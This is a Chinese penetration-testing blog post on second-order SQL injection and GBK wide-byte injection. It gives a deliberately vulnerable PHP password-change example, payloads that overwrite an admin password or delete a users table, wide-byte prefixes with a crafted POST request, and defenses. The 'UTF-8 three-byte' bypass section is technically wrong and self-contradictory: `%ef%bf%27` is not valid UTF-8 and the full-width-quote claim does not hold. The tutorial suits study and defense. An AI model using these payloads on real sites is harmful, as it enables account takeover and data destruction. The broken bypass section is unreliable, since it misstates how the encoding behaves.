---
title: SQL 注入：二次注入与宽字节注入
date: 2024-11-01 08:00:00
tags:
  - Web安全
  - 渗透测试
description: SQL 注入：二次注入与宽字节注入——渗透测试实战笔记，含完整攻击链路与防御方案。
categories: 渗透测试
---

## 二次注入原理

二次注入（Second-Order SQL Injection）的逻辑链：攻击者在第一步存入看似无害但包含 SQL payload 的数据，第二步应用从数据库中取出这段数据拼接到另一条 SQL 语句中时触发了注入。

```mermaid
flowchart LR
    A[注册恶意用户名] --> B[存入数据库 做了addslashes转义]
    B --> C[后续操作取出用户名]
    C --> D[拼入新SQL语句 没有参数化]
    D --> E[注入触发]
```

关键点：**存入时做了转义（安全），取出时直接拼接（不安全）**。

---

## 二次注入实例

**场景：修改密码**

1. 攻击者注册用户名为 `admin' -- `（注意后面有个空格）
2. 注册时 `addslashes()` 处理 → 存入数据库为 `admin\' -- `（反斜杠被转义）
3. 登录后进入修改密码页面，后端逻辑：
   ```php
   $username = $_SESSION['username'];  // 从数据库取出的
   $sql = "UPDATE users SET password='$newpass' WHERE username='$username'";
   ```
4. 此时 `$username` = `admin' -- `（数据库存的原值，没有反斜杠）
5. SQL 变为：
   ```sql
   UPDATE users SET password='hacked' WHERE username='admin' -- '
   ```
6. 效果：把 `admin` 的密码改成了 `hacked`

之所以叫"二次"注入，是因为注入点不在数据存入时（第一次），而在数据被取出后再次使用的时候（第二次）。

**注册用户名为 `admin'; DELETE FROM users WHERE '1'='1`** 可能把整张表删除。

---

## 二次注入的挖掘思路

1. 找注册/修改个人资料/添加评论这类能向数据库**写入**数据的入口
2. 写入的数据会在哪些地方被**取出后拼接到 SQL** 中（修改密码、订单查询、搜索历史等）
3. 写入含 SQL 特殊字符的 payload（`'`、`--`、`;`）
4. 观察后续操作是否有异常页面或行为

---

## 宽字节注入

### 原理

`addslashes()` 会在 `'` 前面加反斜杠 → `\'` = `0x5c27`。但在 GBK 编码下，如果反斜杠 `\x5c` 前面有一个 GBK 范围的字节（`\x81-\xfe`），两字节会被当作一个汉字吃掉反斜杠，`'` 就逃逸出来了。

```
%df' → addslashes → %df\' → GBK解码 → 運' → ' 没有被转义
```

经典 payload：`?id=1%df' OR 1=1 -- -`

`%df` = 223，在 GBK 双字节范围内。`%df`（1字节）+ `\`（`%5c`，被 addslashes 加的）= `%df%5c` → GBK 解码为汉字"運"，后面的 `'` 获得自由。

---

### 其他宽字节前缀

| Payload | 说明 |
|---------|------|
| `%df'` | 最常见 |
| `%bf'` | `%bf%5c` = 繁体字 |
| `%aa'` | `%aa%5c` = 汉字 |
| `%a1'` | `%a1%5c` = 汉字 |
| `%81'` | `%81%5c` = 汉字 |

只要 `%XX%5c` 在 GBK 编码范围内就有效。

---

### 宽字节 POST 注入

POST 注入时，如果 `Content-Type` 能设置编码：

```http
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=gbk

username=%df%27+OR+1%3D1+--+-
```

或者 Burp 改包，把编码声明加上去。

---

## 绕过 set names utf8

有些 PHP 代码写 `SET NAMES utf8` 以为能防宽字节注入——实际上连接编码设为 UTF-8 后，`%df%5c` 不符合 UTF-8 编码规则，MySQL 会报错或不识别，确实限制了 GBK 宽字节注入。但可以用**UTF-8 三字节**变体：

```sql
%ef%bf%27 → 变成 Unicode 全角单引号 ' → 被当作普通字符
```

虽然不如 GBK 直接，但在某些特定场景下仍可利用。

---

## 防御方案

1. **参数化查询（始终如一）：** 不要拼接 SQL，用 Prepared Statement
2. **统一 UTF-8 编码：** `SET NAMES utf8mb4` + PHP 端 `mb_internal_encoding('UTF-8')`
3. **`mysql_real_escape_string()` + 指定 charset：**
   ```php
   mysql_set_charset('utf8');
   $safe = mysql_real_escape_string($input);
   ```
   先设 charset 再转义，GBK 编码下才会正确处理
4. **二次注入防御：** 数据读出后也要参数化，不能因为"数据来源是数据库"就信任

---

> 本文仅用于授权安全测试与学习，请勿用于非法用途。
